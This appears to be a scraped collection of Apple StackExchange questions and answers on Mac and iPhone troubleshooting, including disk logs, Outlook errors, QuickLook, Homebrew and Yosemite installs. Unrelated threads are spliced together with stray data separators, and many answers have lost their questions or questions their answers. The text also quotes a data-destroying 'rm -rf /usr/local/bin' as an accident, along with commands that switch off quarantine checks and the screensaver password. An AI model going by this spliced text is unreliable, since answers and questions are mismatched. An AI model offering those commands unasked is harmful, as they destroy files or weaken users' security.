SAT PassThrough16 failed, retrying with PassThrough12\nOct 15 20:53:47 peter-imac kernel[0]: SATSMARTDriver v0.9: enclosure 'Unknown 1058:1144', disk serial 'WD-WCATRA455179', revision '05.01D05', model 'WDC WD1002FAEX-00Z3A0'\nOct 15 20:53:47 peter-imac kernel[0]: User client already open\nOct 15 20:53:47 peter-imac kernel[0]: Open failed\nOct 15 20:53:47 peter-imac.fritz.box Disk Drill[405]: /dev/disk0\nOct 15 20:53:47 peter-imac.fritz.box Disk Drill[405]: /dev/disk1\nOct 15 20:53:47 peter-imac.fritz.box Disk Drill[405]: -99418112\nOct 15 20:53:47 peter-imac.fritz.box UserNotificationCenter[477]: ApplePersistence=NO\nOct 15 20:53:48 peter-imac.fritz.box com.apple.kextd[14]: Can't create kext cache under / - owner not root.\nOct 15 20:53:49 --- last message repeated 3 times ---\nOct 15 20:53:49 peter-imac.fritz.box Disk Drill[405]: found disk: WD WDC WD1002FAEX-00Z3A0 Media, with size: 1000170586112, bsdname: disk2\nOct 15 20:53:49 peter-imac.fritz.box Disk Drill[405]: S.M.A.R.T. data (id,curr,threshold,raw) model: WDC WD1002FAEX-00Z3A0, firmware: 05.01D05\nOct 15 20:53:49 peter-imac.fritz.box Disk Drill[405]: 199   200 0   0\nOct 15 20:53:49 peter-imac.fritz.box Disk Drill[405]: 197   200 0   0\nOct 15 20:53:49 peter-imac.fritz.box Disk Drill[405]: 11    100 0   0\nOct 15 20:53:49 peter-imac.fritz.box Disk Drill[405]: 9 92  0   5937\nOct 15 20:53:49 peter-imac.fritz.box Disk Drill[405]: 7 100 0   0\nOct 15 20:53:49 peter-imac.fritz.box Disk Drill[405]: 5 200 140 0\nOct 15 20:53:49 peter-imac.fritz.box Disk Drill[405]: 3 195 21  3250\nOct 15 20:53:49 peter-imac.fritz.box Disk Drill[405]: 1 200 51  0\nOct 15 20:53:49 peter-imac.fritz.box Disk Drill[405]: 193   199 0   3085\nOct 15 20:53:49 peter-imac.fritz.box Disk Drill[405]: 200   200 0   0\nOct 15 20:53:49 peter-imac.fritz.box Disk Drill[405]: 198   200 0   0\nOct 15 20:53:49 peter-imac.fritz.box Disk Drill[405]: 12    98  0   2307\nOct 15 20:53:49 peter-imac.fritz.box Disk Drill[405]: 194   111 0   36\nOct 15 20:53:49 peter-imac.fritz.box Disk Drill[405]: 10    100 0   0\nOct 15 20:53:49 peter-imac.fritz.box Disk Drill[405]: 192   198 0   2034\nOct 15 20:53:49 peter-imac.fritz.box Disk Drill[405]: 4 95  0   5116\nOct 15 20:53:49 peter-imac.fritz.box Disk Drill[405]: 196   200 0   0\nOct 15 20:53:49 peter-imac.fritz.box Disk Drill[405]: Error determining system volume, trying file systems\nOct 15 20:53:49 peter-imac.fritz.box Disk Drill[405]: Error opening file system in partition at offset 0\nOct 15 20:53:49 peter-imac.fritz.box Disk Drill[405]: Using it as RAW\nOct 15 20:53:49 peter-imac.fritz.box Disk Drill[405]: detect OEM volumes\nOct 15 20:53:49 peter-imac.fritz.box Disk Drill[405]: Found filesystem raw, offset 0, size 1000170586112 \nOct 15 20:53:49 peter-imac.fritz.box Disk Drill[405]: Volume: /dev/disk2 (WD WDC WD1002FAEX-00Z3A0 Media) mounted: not mounted\n\nIgnore the Can't create kext cache stuff, that is independent and written all the time.\n\nA: If I move the hard drive back into the iMac, everything is fine.

First I explain what I use:\n\n\n*\n\n*Fostex AR 101 that comes with 2 directional mini stereo microphone\n\n*2 rode Lavalier omnidirectional\n\n*cables: 2 x 3.5mm male - female TRS cables, two \"y\" 3.5mm male and 2 female TRS 3.5mm jacks adapter. \n\n\nConnect the cables male jack into the two microphone jacks of the Fostex AR 101. On the other end of the cable connect the \"y\" adapter. The \"y\" adapter has two female 3.5mm jacks, 1 is for the Rode Lavalier and the other you connect the mini directional microphone. So two directional on the chest and the two rode Lavaliers attached to the male cable jack make that you get great stereo sound. You get the sound of the whole area and every word you say will be displayed very clearly. \nThe Fostex cost prices = +- 150. Euro, the adapters +- 30 euros and the rode Lavalier 170 euro each  without Micon 2, 3.5mm adapter. It is claerly, the Lavalier is the high cost. There are cheaper Lavaliers that seem works great but myself do not know the level because I never use Lavaliers from other factory.\nNote: \nI'm not musician, I wanted only stereo using video apps on the iPhone. As I said I do not know the audio results with cheap Lavaliers or battery powered mics. Rode is indeed an expensive Lavalier but it can be cheaper with the Smartlav were is also needed the KVConnection, SC4 or SC3 adapter, just check it out cause I'm right now not able to do so. \nConclusion:\nIt is possible to get low budget stereo in comparing DSLR camera and expensive Rode stereo VideoMic of how call it.\n", "Q: Outlook 2011 crashing at startup (main window buggy) I was using Outlook (last v., updated) since the Mavericks update without any issue.\nBut since couple of days, when I start it, the main window takes 1 or 2 real minutes to display, and is very buggy (shadow is missing, it's cutted on the rigth), and unusable.\nI can't figure out what I did whn it happens (only that I used Safari – instead of Fx – for 1 day, but didn't install anything).\nCapture of the window (in Fr) – yes, no shadow (and I got a message in cosnole related to a bug with a background blur).\n\nI rebuilt the main identity, checked for updates, and checked for unusual console messages, nothing.

I used time machine previously and I have done a clean install to get back some space on my mac. At setup process I skipped to use time machine I just wanted to get my machine up and running and set up a new account with same username as earlier. Am I able to retrieve document from backup time machine used to done?\n\nA: You can drill down into the Time Machine folder hierarchy just like any other disk...\n[Time Machine Drive] > Backups.backupd > [Computer name] > Latest - then you're into the old hierarchy as it was on your previous system.\nif Latest has been overwritten by the new system then you'd have to dig by date or use search.\n", "Q: Outlook 2011 for Mac \"could not synchronize record\"error I keep getting hundreds of these \"Could not synchronize record: [...]\" errors, but the meetings and emails refered to in the Errors panel do not exist - I deleted them, and confirmed that they are not in any folder, calendar, or anywhere.\nThey say error number: 19759\nE.g.:\n\n\nA: I fixed my issue by searching for the email thread in my trash and sent items. Deleted all instances and the error went away. My issue was in Outlook 2014, but I've had the same issue in 2011 before too.\n\nA: It turns out that these meetings were still on the hard drive.  I went to Finder, searched on the title of the meetings (which was in the Error message itself), and simply deleted the files in question.  They were kind of \"grayed out\", which led me to believe they were either owned by another user or had failed to get deleted correctly.\n\nA: Seems like I have resolved the issue, by right clicking on the folder that was having issues (my Drafts folder), selecting \"Properties\" and under \"General\" clicking \"Empty Cache\"\n", "Q: I deleted /usr/local/bin on my Mac. Is there any way I can see what was installed there? I accidentally ran rm -rf /usr/local/bin.  Yes, I know, I'm an idiot.\nIs there anything short of attempting to run every single application on my Mac to see what applications need to be reinstalled?\n\nA: Most GUI Applications don't touch /usr/local/bin, so the Applications in your /Applications folder should still be in working condition. Some do install command line tools, but usually there is a menu item in the help or program menu to reinstall that command line item. Bottom line: If you don't use the command line much, you should be fine. If you use it frequently, you will see a \"File not found\" error when trying to run the command.\nThe only way to see what was in there, is indeed a backup.\n\nA: If you used Homebrew, this directory tells you what you have lost:\n\n/usr/local/Cellar/\n\nautoconf/     cloog/        hello/        libmagic/     libxml2/      p7zip/        ruby-build/   w3m/\nautossh/      crystal-lang/ imagemagick/  libmpc/       libyaml/      pkg-config/   sdl/          x264/\nawscli/       ffmpeg/       isl/          libpcl/       llvm/         pngcrush/     shiboken/     xvid/\nbdw-gc/       freetype/     jpeg/         libpng/       mpfr/         pyside/       ssdeep/       xz/\nbinwalk/      gcc/          lame/         libtool/      openssl/      qt/           tree/         \nbrew-cask/    gmp/          libevent/     libvo-aacenc/ optipng/      rbenv/        unrar/    \n\nTo correctly execute Homebrew reinstall scripts you might also need to restart bash session if you used rbenv.\n\nA: This is what worked for me to restore Homebrew installations:\nls /usr/local/Cellar | awk -F\"/\" '{ print $1 }' | parallel 'brew unlink {}; brew link {}; '\n", "Q: Cannot play videos in my iPad Air after upgrading to iOS 8.0.2 After upgrading my iPad Air to iOS 8.0.2 I can no longer play videos in any application.\nI've tried playing videos in Safari, Youtube, MVP Video Playlist, and any other app you can think of and nothing, I even tried playing purchased videos from iTunes in Apple's own Videos app and it just doesn't work.\nIs anybody else experimenting this issue?\n\nA: After posting this same question in Apple Support Communities Diavonex quickly replied with a simple solution:\n\n(A) Try reset iPad\nHold the Sleep/Wake and Home button down together until you see the Apple Logo.\nNote: Data will not be affected.\n(B) Close all apps in the multi-task window\n1.Double-click the Home button.\n\n  \n*Swipe the app's preview up to close it.\n  \n*Preview will fly off the screen.\n\nReference: https://discussions.apple.com/message/26841501#26841501\n", "Q: Will the new iPad Mini update to iOS8 when activated the first time?

My question is when i open or turn on the ipad is it updated to ios 8 right away or I will be the one to update it?\n\nA: You will need to update it yourself. The iPad most likely has iOS 7 on it, and will only update itself once you have confirmed that you would like it to be updated.\n", "Q: Early 2011 Macbook Pro DisplayPort 1.2 driver So I searched a bunch, lots of threads on this, but unfortunately either they haven't been resolved, or its not helpful.\nI have a Macbook Pro (early 2011) model w/ the Intel Core i5. It is currently running OS X Version 10.9.5, and I just recently purchased a second monitor for it (Dell P2014H). I am using a Mini DisplayPort to Display port cable to connect this monitor to the laptop, and it is working.\nHowever, the Macbook is restricting the resolution to 1360x768, it's not using the 1600x900 that I would like. If you set it to that resolution, the 2nd monitor blacks out, and goes to sleep. After a lot of troubleshooting (resetting PRAM, SMC...), I borrowed a Mini DisplayPort to VGA adapter from a friend, and I tried that. That worked with the proper resolution, no problems.\nNow, I am guessing that this is occurring because of DisplayPort 1.2 that the monitor uses, and the macbook does not work with that. Unfortunately Dell does not make a driver for OSX. I could also not find any drivers online. Does anyone have/know where I can find a driver, or know another method I can use to fix this resolution issue (other than buying a vga or dvi adapter)\nThanks in advance!\n\nA: I had a similar compatibility issue a few years back with a Dell monitor.  After a replacement and multiple support calls, it ended up being the Mini DisplayPort to DisplayPort cable.  The embedded chip didn't send the proper info the Dell monitor is expecting.\nAfter I replaced the Mini DisplayPort to DisplayPort cable with a Mini DisplayPort to DisplayPort adapter and a normal sized DisplayPort to DisplayPort cable, it worked properly.\nThere is some kind of incompatibility with Dell monitors and MDP to DP cables.  I've used the MDP to DP cable with other monitors without problems but have only had success with Dells when using a MDP to DP Adapter with a DP-DP cable.\nHope this helps!\n", "Q: How can I sum values over a range of dates in Numbers? I have the following formula\n\nSUMIFS(Daily Log::Income,Daily Log::A,\"≥\"&A3,Daily Log::A,\"<\"&A4)\n\n\nthat I want to sum income over the associated month.  As you can see, it's not doing what I am expecting it to—how can I effect what I need?\n\n\nA: It works by dereferencing the value of a cell directly to the condition\nExample:\nSUMIFS(Daily Log::Income,Daily Log::A,\">=2014-07-01\",Daily Log::A,\"<2014-08-01\")\n\nReferencing the cell could also be made possible with the same construct; by adding ampersand followed by the cell name outside the double quotes.\nExample:\nSUMIFS(Daily Log::Income,Daily Log::A,\">=\"&A3,Daily Log::A,\"<\"&A4)\n\n", "Q: Unpacking .bundle files via terminal There's a known method for unpacking .bundle by going to Show Package Contents, but what if that option is unavailable?\nThere is a solution that works for .pkg files by using the pkgutil --expand command. Is there any solution for .bundle?\n\nA: I was under the impression that .bundle files are actually folders - in your terminal application, try typing the following:\ncd archive_name.bundle\nls\n\n\nFor example, on my end:\ncd IMDB.bundle/\nls\n$Contents   README.md \n\n", "Q: MAC OS X refuses to mount the main volume Macintosh HD, saying that there's an “Invalid content in journal” I have a problem with my MAC.

I want to execute both of these commands in the same shell. I don't want to use another terminal, nor do I want to use another tab. I read something there is a command fg to do that stuff but don't know how to use it. Suppose I have started downloading video using youtube-dl. How can I hide that process and compile codes. And once I am done compiling I switch over to see how much the video has downloaded and vice-versa.\n\nA: You can use screen. This allows you to set up new screens in your shell which you can switch between.\nQuick reference guide:\n\n\n*\n\n*ctrl-C creates a new screen\n\n*ctrl-N switches screens\n\n*ctrl-D ends screen\n\n\nA: The easiest way to run a command in the background is to put an & at the end of the command.  It will start, and return you to the prompt immediately.\nAnother way would be to suspend the current process with CTRLz, and type bg, the corollary to the fg command you already looked up.\n", "Q: how to reactive the lost mode on iPhone 5 I upgraded my phone to iPhone 6 and in the process of erasing data etc on my iPhone 5, i somehow put the lost mode in find my phone.  I have since sold my iPhone 5 and now it is still linked to my current apple id.  How do i deactivate the lost mode lock on my old phone?\n\nA: It's explained in http://support.apple.com/kb/ph2702:\nRemove an iOS device you no longer have\nIf you no longer have the iOS device because you gave it away or sold it, you need to remotely erase it before you can remove it.\n\n*\n\n*Sign in to icloud.com/#find with your Apple ID (the one you use with iCloud).\nIf you’re using another iCloud app, click the app’s name at the top of the iCloud.com window, then click Find My iPhone.\n\n\n*Click All Devices, then select the device.\n\n\n*Click Erase [device], then enter your Apple ID password.

In my office we have two Airport Express routers both acting as access points (no DHCP). They both broadcast the same wifi network (same name). \nNow, the one I'm sitting right next to was setup later than the first one, due to bad reception from the first one. \nNow my problem is, that even though I'm sitting right next to the new one, my computer keeps connecting to the first one with the bad reception. I have tried removing the network and re-add it again, but it still connects to the one with bad reception. \nHow can this be, and how do I solve it, without changing the network names and manually choosing which one I want to connect to.\n\nMy question is btw. somehow similar to this I think: Connect Mac to closer Access Point\n\nA: With your setup of multiple access points sharing the same SSID (network name), your wifi client will use its built-in roaming algorithm to switch. But even if you have a marginal signal (i.e. one bar) on the one that's farther away, most times, the wifi client will stick to that access point, simply because it was the first one configured. To get around this you have two options...\n\n\n*\n\n*Use different SSID's, and in the Advanced section in Network Preferences/Wi-Fi, drag/drop them in the preferred order. The good thing about this is the ability to quickly see which one you're connected to at any time and explicitly switch over whenever you want.\n\n*If you must have the same SSID... Change the SSID for the closer (desired) access point to a new name (e.g. \"NewName\"), re-associate your computer to that access point with the new name, then change SSID for the older access point to the same new name.\n", "Q: To view the full contents of this document, you need a later version of the PDF viewer Sometimes I receive PDF files that open with Preview (Version 7.0 (826.4), Mavericks) with the following message:\n\nTo view the full contents of this document, you need a later version\n  of the PDF viewer.

Ever.\nWhen I use a Windows machine and open this PDF with Acrobat Reader there it contains a form with dropdowns and input fields.\nIs there a way to open this pdf in OS X? I would prefer the Preview.app.\nScreenshots:\n\n\n\nA: Certain PDF files (dynamic XFA forms) created in Adobe LiveCycle can only be opened in Adobe Reader and Adobe Acrobat. When you try to open these files in an alternative PDF viewer, then you will see this error message.\nUnfortunately, it's not easy remove this message and modify the PDF so that it can be opened in alternative PDF viewers. The person who created the original form must re-create the form using options that do not restrict which PDF viewers can open and display the file.\nAdobe has made the decision that since very few non-Adobe products support these special PDF files, that it is better to show this message -- and require the user to download Adobe Reader or Adobe Acrobat -- than it is to let the PDF viewer try to render the document.\nSource : http://www.quickpdflibrary.com/faq/if-this-message-is-not-eventually-replaced-by-the-proper-contents-of-the-document.php\n...so the answer to your question is no, Preview can't do it. It's Adobe Reader or nothing\n\nA: There is a way to do it in Terminal.  In Adobe Acrobat, save file as a Postscript file.  I generally save it to my desktop.  Then, open Terminal and browse to desktop by typing cd ~/Desktop.  Then, enter the command\npstopdf filename.ps\n\nOn the desktop,  there should be a new PDF file.  It can now be opened by Preview.\n\nA: I managed to open XFA documents using this simple chrome plugin:\nhttps://chrome.google.com/webstore/detail/pdf-reader/ieepebpjnkhaiioojkepfniodjmjjihl\n\nA: As a person who creates and distributes forms used for automation in our agency: I hate this. I find it truly obnoxious when Adobe forms do this, because 95% of the time, the form in question does not use ANY of the XFA features that actually require this (one example would be showing or hiding document sections based on entry, or expanding fields to fit text entered - if the form is not doing this, it should have been a static form rather than an XFA form!).\nHaving said that, every time someone returns to me an Adobe form that was filled (or worse, signed) in Preview I get frustrated, as Preview mangles the form fields. At best they are locked and marked as read-only, which I can fix in Adobe; at worst they are flattened and all entered text is no longer recognized as being in a form field entry.\nIf you are simply filling in forms this is not an issue. If the recipient is using the form entries to populate spreadsheets or databases, you've just made this impossible without manually copying and pasting.\nMy point is that your personal preference for PDF viewer may be entirely at odds with the needs of the person providing the file. Reader is free. It does not need to be your default viewer, heck you don't even need to keep it installed after you use it - but if you are returning a mission-critical form, you really ought to consider using a program that you know will be compatible. If not, you might be the recipient of a lot of emails saying \"your form was blank\" or \"we couldn't read this, please resubmit\".\nThere are times when sticking to your guns bites you.\n", "Q: iPad memory used if far higher than sum of all App's memory usage I've got two iPad Air, one 64GB the other 16GB.

I don't have .mp3s there so I can't speak to that.\n\nA: Thumbnails are generated by QuickLook. You can reset its cache by typing qlmanage -r cache.\nIf this didn't work reset it completly with qlmanage -r.\n\nA: To refresh icons go to target folder (like cd /home/John/music/nocovers/ or cd ~/music/nocovers/ whatever - they mean the same for user John assuming /home/John/music/nocovers/ your target directory) in the Terminal and there execute:\n\nqlmanage -p .\n\nShould do the job.\n\nA: As of Catalina, it looks like the Dock thumbnails are updated by this process:\n/System/Library/Frameworks/QuickLookThumbnailing.framework/Support/\ncom.apple.quicklook.ThumbnailsAgent\n\nkillall com.apple.quicklook.ThumbnailsAgent\n\ncauses the Dock stack icons to go to a generic icon.\nSo, what I did to fix this:\nqlmanage -r cache \nqlmanage -r \nkillall com.apple.quicklook.ThumbnailsAgent\nkillall Dock\n\nVoila\n\nA: Check if the mp3 really have an artwork with some tag editor like https://itunes.apple.com/it/app/tag-editor-free/id984278082?mt=12\nIf there is maybe just try to re-add the artwork with the tag editor instead with itunes.. if you can see the icon now on finder so is itunes related issue and maybe the random I-heard-somebody-say is the right direction ;)\n\nA: I found this thread on the Apple forum where one guy said he had the same problem as you with Finder not showing the cover art on MP3 icons.  He said he fixed the problem by going into iTunes and deleting all his Voice Memos (apparently you have to delete them from both the Playlist and Genre sections in iTunes) and then restarting iTunes.

So, the first command is usually preferred.

User can disable by \"com.apple.LaunchServices LSQuarantine -bool NO\" for all or \"xattr -rd com.apple.quarantine Application.app\" for particular app.\nI had also signed the app with developer ID.\nSo, how to disable this dialog box from popping.\n\nA: Simply right-click your application and choose \"Open\".  That immediately gets around Gatekeeper without disabling the feature (which is highly effective at keeping the mac safe from drive-by infections).\n", "Q: Downgrading from iOS 8.1 beta 2 to iOS 8.0.2 I have to use a backup of my iPhone but iTunes says that is not compatible with \nthe beta distribution. So I need to downgrade to iOS 8.0.2 but it seems not possible. \nAny Idea?\nNow I'm downloading it (iOS 8.0.2) manually and I'll try to replace manually.\n\nA: The only method is this:\n\n\n*\n\n*Be prepared to LOSE ALL DATA, so do the proper backup.\n\n*Turn off the iPhone.\n\n*Push the Home button until the iTunes icon on the iPhone appears red.\n\n*Connect it to your computer and do the restore.\n\n\niTunes will, at this point, download the last official release of iOS. And, keep in mind, you will LOSE ALL DATA.\n", "Q: Turning off Require Password on a filevault enabled MacBook Air 2011 I am trying to use the product form soma-zone.com called RedHand.  The only catch is you must have Require Password turned off in the Security Preferences Pane.  RedHand won't start until it is turned off, but I have filevault 2 enabled which automatically sets Require Password to true and immediatley.  I can trick it for a few seconds using\nsudo defaults write com.apple.screensaver askForPassword 0\n\nThis only works for a few seconds then the default is changed back automatically to 1.  Is there a cache file or another work around to disable Require Password when FileVault 2 is enabled? \nLink to product RedHand\nMacBook Air 2011 running 10.9.5\n\nA: There is another piece of software similar to RedHand called Watchmac (from bloo7). I suggest you try using Watchmac as a work-around to this issue.\n", "Q: Why all OS X verions are 10? I was looking at the versions section of Wikipedia's article for OS X and I realized that all versions are prefixed with 10. Why? What is the logic behind prefixing al versions with a number that never changes?\nDoes it have to do something with the X in OS X? Why is it OS X? Is there some kind of fanaticism over the number 10 at Apple?\n\nA: OS X is supposed to be pronounced \"Oh Ess Ten\" though no-one outside Apple ever seems to, common parlance would be \"oss ex\".\nThough OS XI would, I guess, be OS eleven, how many people are going to end up calling it \"oss exie\" or \"oss ex eye\"?\nThe actual answer to the question \"Why?\" is presumably because Steve Jobs decided it would be; & that would brook no argument.\n\nA: This is the list of Apple milestone OS releases for Macintosh systems. Note the numbering.\n\n\n*\n\n*System 1\n\n*System 2\n\n*System 3\n\n*System 4\n\n*System 5\n\n*System 6\n\n*System 7\n\n*System/Mac OS 8\n\n*Mac OS 9\n\n*Mac OS X Server\n\n*Mac OS X Public Beta\n\n*Mac OS X 10.0 Cheetah\n\n*Mac OS X 10.1 Puma\n\n*Mac OS X 10.2 Jaguar\n\n*Mac OS X 10.3 Panther\n\n*Mac OS X 10.4 Tiger\n\n*Mac OS X 10.5 Leopard\n\n*Mac OS X 10.6 Snow Leopard\n\n*OS X 10.7 Lion\n\n*OS X 10.8 Mountain Lion\n\n*OS X 10.9 Mavericks\n\n*OS X 10.10 Yosemite (unreleased)\nAfter 10.10, there will either be 10.11, or 11, or something completely different.\nThe OS releases began with 1, and have progressed to 10. Because the base system of Mac OS X 10.0 Cheetah (darwin, etc) remains relatively similar to the current day base system, this is why I believe that the numbering of (Mac)OS X systems have been point-based. \n", "Q: How do I do a clean install of Yosemite? I'd like to start from scratch with Yosemite. I have Mavericks running on my iMac now but I'd like to just wipe the system and start with a clean Yosemite install.\nHow do I do a clean install of Yosemite on my machine, not an upgrade install?\n\nA: I downloaded the OS X Yosemite GM from the App Store.  Quit the installer that pops up with out installing and made a bootable flash drive with it on it.  Used the following command below just change the paths to fit your need.\nsudo /Applications/Path to *Yosemite Installer*.app/Contents/Resources/createinstallmedia --volume /Volumes/*FlashDrive* --applicationpath /Applications/Path to *Yosemite Installer*.app --nointeraction\n\nThen booted the computer to the usb flash drive and wiped the previous partitions using Disk Utility.app and installed a fresh copy.\n\nA: I'd use a new HD, if you are ever thinking you may need to revert.\nYosemite appears to make your boot drive into a Core Storage Volume, making repartitioning difficult.\n", "Q: Restoring a Modern Mac Laptop from an External Backup Drive Is it possible to \"re-clone\" a modern mac laptop (i.e. no removable hard drive) from an external (non Time Machine) hard drive?\nThat is, I'm about to buy a new Mac laptop for the first time in 5 years, and I'm reviewing my backup strategy.  I've typically kept an up to date external hard drive with a recent version of my machine cloned (via a program like SuperDuper or Carbon Copy Clone), and if I ran into hard drive failures I could just pop the cloned drive in my laptop and be back up and running right away (restoring files from between the last clone and failure for other, external backup sources)  \nIt's my understanding modern mac laptop don't have removable hard drives -- it's all SSD chips permanently attached to the mother board. It's also my understanding Thunderbolt doesn't have an equivalent to Firewire's target disk mode.\nSo, if my new Mac laptop fails and Apple gives me a replacement laptop (or I buy a replacement laptop), is there a way to take this fresh machine and re-clone its hard drive so it matches what's on my external backup drive?  Or am I left manually copying files from my backup? \n\nA: I think the 'modern equivalent' of your anticipated disaster recovery scenario could still be done by CCC, with caveats.\nReceive new machine, ready with Recovery partition & brand new OS, clone CCC boot partition back to new boot partition. Assuming parity with machine/drivers etc, i.e. like for like, then I foresee no issues.\nThe same maybe couldn't be said if the new machine was different, newer - as you cannot anticipate the new architecture - for that you'd need Time Machine, to be certain.\n\nA: I believe that ALL current Mac's with should run in Target Disk Mode for FireWire or ThunderBolt. You may want to verify this for your specific models since there have been a few systems that lacked TDM. \nBoth systems should be able to run the version of Mac OS that you are cloning. And old version of OS will not always be able to run on new hardware. Very minor OS versions differences can be very significant here, since sometimes new hardware gets its own minor version. \nThe worse case as far as amount of time required would be to clone your old system to a USB external hard drive, and the attach that to the new system and boot off it it. Then clone to the new internal SSD.\n", "Q: Unable to upgrade from OS X Mavericks to OS X Yosemite I have a problem upgrading the system from os x mavericks to os x yosemite. I tried to update it through the app store, but it says that it is unavailable in the UK? Can anyone explain to me what this means? \n\nA: It means it isn't available in your region yet. You just need to give it a bit of time.\n", "Q: Pinyin input placed behind Hangouts window Usually when I type Pinyin input, the suggestions appear over the window like this:\n\nHowever, when using Google Hangouts, they appear behind which makes it somewhat useless:\n\nHow can I make it so that they appear in front of the window as normal?\n\nA: You can disable the on top feature of that window. \n\n\"Change settings that apply only for the Hangouts Chrome desktop app\n  Click the Chrome launcher icon .

This means that they can be on top of any system window or dialog, including the Pinyin input windows.\nThere does not appear to be a fix for this at this time as it is the developer's discretion to fix their implementation of Always On Top as it is non-standard.\n", "Q: Can I replace RAM or processor in new Mac mini? Is it possible from technical point of view to replace/upgrade on my own RAM or processor in new Mac mini released today (assuming that I'll use compatible replacement)?\n\nA: No RAM or processor replacement in the Mac Mini 2014\nAn iFixit teardown reveals this. And @Pol posted a link to macminicolo.net were you can read about the soldered RAM.\nThe processor and the RAM is soldered onto the motherboard. Even in a clean room, a soldering iron and a steady hand, it would be nearly impossible. You are not allowed to do this on your own, your warranty will expire on this one.\nYou can replace your RAM yourself, Apple has even provided a guide on how to do it on similar hardware (2012 model). Here you can find the guide: \"Mac mini: How to remove or install memory\". No problems with your warranty.\n\nA: As it turns out, we can't replace RAM too. It's soldered.\n", "Q: How do I preserve leading zeroes in Mac Excel? I'm using Excel (v 14.4.4) on my Mac (10.9.5).  I have opened a CSV file and I wish to save it to an .xls format (Excel 97-2004 Workbook).  I have a column that has 6 digit numbers, some of which begin with a leading zero.  When I save my CSV to XLS, the cells with leading zeroes lose these leading zeroes.  How do I keep them there?\n\nA: From the Home tab, select the cells you wish to format, and from the format drop-down under Number select Custom. Or, right-click and choose Format Cells, or hit Cmd-1.\nThis will pop-up a dialog window with the various formatting options.\nAgain, make sure you're on Custom.\nIn the Type box type in: 000000\nClick Ok.\nAlternatively - change the formatting type to text. This will keep whatever you type in the box.\n\nA: It depends on what you are trying do do with the spreadsheet but putting <'> (single quote) in-front of the leading zero will preserve it with the conversion from CSV to xls format.\nAs @Alex says converting the cells to text will work, and inserting the single quote at the start of the cell just converts it to text.\n", "Q: Would it work if I swap the hard drive between two Macbook Pro? I have a 17\" and a 15\" Macbook Pro from about 2010.  The 15\" one recently has some problem with the speaker.  Can I take its hard drive out and install it into the other 17\" one?  Would it work?  The data I immediately want to work on is on the 15\" one.\nMore detailed version info:\nI looked up version information for my Macbook Pro by their serial numbers at https://selfsolve.apple.com/agreementWarrantyDynamic.do and compared to Apple's list of models http://support.apple.com/kb/ht4132 and determined\nMacbook Pro 17\", Mid 2010\nMacbook Pro 15\", Early 2011\n\nA: This will work with the right toolkit (see links below) since the system software (Mac OS X) is almost hardware-agnostic, especially if you use a newer system than the original one. Actually some of the different MacBook Pro Mid 2010 models were sold with the same hard disks (the 500 GB serial ATA). The only thing you may have to adjust is the screen resolution.\nHard Disk Replacement/Swap:\nMacBook Pro 15\" Mid 2010 MacBookPro6,2\nMacBook Pro 17\" Mid 2010 MacBookPro6,1\nBut why don't you just use a Firewire 800 cable, start the MacBook Pro 15\" in Firewire Target disk mode and connect it to the MacBook Pro 17\"?\nYou may even start your MacBook Pro 17\" from the Target mode MacBook Pro 15\" by choosing the latter in System Preferences -> Startvolume.\nUpdate: \nHard Disk Replacement/Swap: MacBook Pro 15\" Early 2011 MacBookPro8,2\nThe standard of the Serial ATA interface changed from 2.0 (MacBookPro6,1) to 3.0 (MacBookPro8,2). If the MacBookPro8,2 contains a SATA II hard drive it will work, if it contains a SATA III hard drive it should work (depends on the hd).\n", "Q: Terminal flashes on empty backspace with Yosemite Since using Yosemite, I've had the annoying problem of my current Terminal window flashing when backspacing on an empty line. I know on previous versions of OS X this flashing was not default, and could be toggled in accessibility settings, but I cannot find the same setting and I'm dying to get this turned off. Any known ways to get rid of it?\n\nA: That is called the visual bell, and by default it’s enabled when your sound is muted. To change that setting, go into Terminal > Preferences > Profiles > <your profile> > Advanced.\n\nYou can also run\necho $'\\nset bell-style off' >> ~/.inputrc\n\nto disable Readline's use of the bell (deleting on an empty line, tab-complete, etc.). You will need to restart your session for this change to take effect.\n", "Q: Can I use Javascript to write a custom function for Numbers? It's always annoyed me that I can't write a custom function for Numbers. It would make the spreadsheet so much more useful to me.  In Google Apps spreadsheets you can do it, using Javascript.  \nIn other words, you write\nfunction myCustomStuff(a, b) { ... }\n\nand a cell can contain:\n=myCustomStuff(A1, B2)\n\nNow, in Yosemite, they have Javascript automation. I wonder if it's possible.  \n\nA: No - injecting a function looks to be something that isn't easily scriptable.\nA simple macro might be doable and you could start with these two references:\n\n\n*\n\n*https://developer.apple.com/library/mac/releasenotes/InterapplicationCommunication/RN-JavaScriptForAutomation/index.html\nThis link is the developer documentation on how to connect the script to the Numbers app.\n\n\n*\n\n*https://iworkautomation.com/numbers/cell.html\nThis automation site has for a very long time been the best place I've known to learn and implement AppleScript tools. \nIf you're new, you could follow the numbers tutorial in AppleScript to make sure  you have a workable task and then re-code it in the new language. Then you'd need to determine the hooks in Numbers and see if your specific task is doable without utilizing the Objective-C bridge which allows lower level integration to apps on OS X.\n", "Q: ITunes Connect Review of an app with an incompatible API I have a global strategic problem which resembles a philosophic issue (well, sort of ;-)).\nI have an app interacting via REST/JSON with a django webserver. The web [front|back]end is rapidly and gradually evolving, but, in case of severe changes, we introduced an in-app mechanism to manage API breakages (a popup is presented to the user, inviting him/her to install the updated app from the store).\nWhat I never thought about before is how to manage the review process, considering that, if I upgrade the backend just for the purpose of the review process:\n\n\n*\n\n*old applications won't be able to speak the new API language;\n\n*they will be presented with the upgrade message without being actually able to find it on the store;\n\n*people will see the upgraded frontend before being able to interact with their own app with it.\n\n\nThe only thing that came to my mind is to let the existing users suffer from this change until the moment in which they will be able to download the new version.\nHow would you handle this empasse? \n\nA: Just in case any other person should look for a solution to a similar problem: made through Apple's reviewing process through the setup of a /2.0 subdomain for the backend. \nEvery old user is still pointing to the old url and, whenever the switch is ready, we will make the old uri point to the new backend (so that we will have two simultaneous groups of URIs address the same backend).\nAll the old applications will still point to the old URI and get the \"Invite to upgrade\" message. When upgraded, all the applications will point to the /2.0 subdomain.\nFrom a web browser people will still be able to use the old URL and get served by the new backend.\n", "Q: Will Eclipse + Android Developer Tools plugin work on OS X Yosemite?
